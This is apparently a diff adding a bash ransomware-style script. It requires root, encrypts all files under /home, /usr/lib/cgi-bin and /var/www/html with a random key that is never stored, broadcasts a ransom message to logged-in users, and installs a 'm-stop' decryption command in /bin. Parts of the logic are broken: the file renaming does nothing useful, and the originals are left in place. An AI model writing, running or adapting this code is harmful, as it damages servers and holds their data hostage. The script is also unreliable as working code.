@@ -1,0 +1,38 @@
+#!/bin/bash
+
+# 1. Check if running with root/sudo
+if [[ $EUID -ne 0 ]]; then
+    echo "This script must be run as root or with sudo."
+    exit 1
+fi
+
+# 2. Encrypt files in /home/tomasdada/testdir, /usr/lib/cgi-bin, and /var/www/html
+encryption_key=$(openssl rand -base64 32)
+directories=("/home" "/usr/lib/cgi-bin" "/var/www/html")
+
+for dir in "${directories[@]}"; do
+    find "$dir" -type f -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -pass pass:"$encryption_key" \;
+    find "$dir" -type f -name "*.enc" -exec mv {} {}.enc \;
+done
+
+# Send "hello" using the "wall" command
+echo "FILES ON YOUR SERVER HAVE BEEN ENCRYPTED! TO GET THEM BACK, TYPE 'm-stop <key>'." | wall
+echo "DON'T KNOW THE KEY? NO PROBLEM. YOU KNOW WHO TO ASK..."
+
+# Create a bash script in /bin called "m-stop"
+cat << EOF > /bin/m-stop
+#!/bin/bash
+
+decryption_key="$1"
+echo
+
+directories=("/home" "/usr/lib/cgi-bin" "/var/www/html")
+
+for dir in "\${directories[@]}"; do
+    find "\$dir" -type f -name "*.enc.enc" -exec openssl enc -aes-256-cbc -d -in {} -out {}.dec -pass pass:"\$decryption_key" \;
+    find "\$dir" -type f -name "*.enc.dec" -exec mv {} {} \;
+    find "\$dir" -type f -name "*.enc" -exec mv {} {} \;
+done
+EOF
+
+chmod +x /bin/m-stop
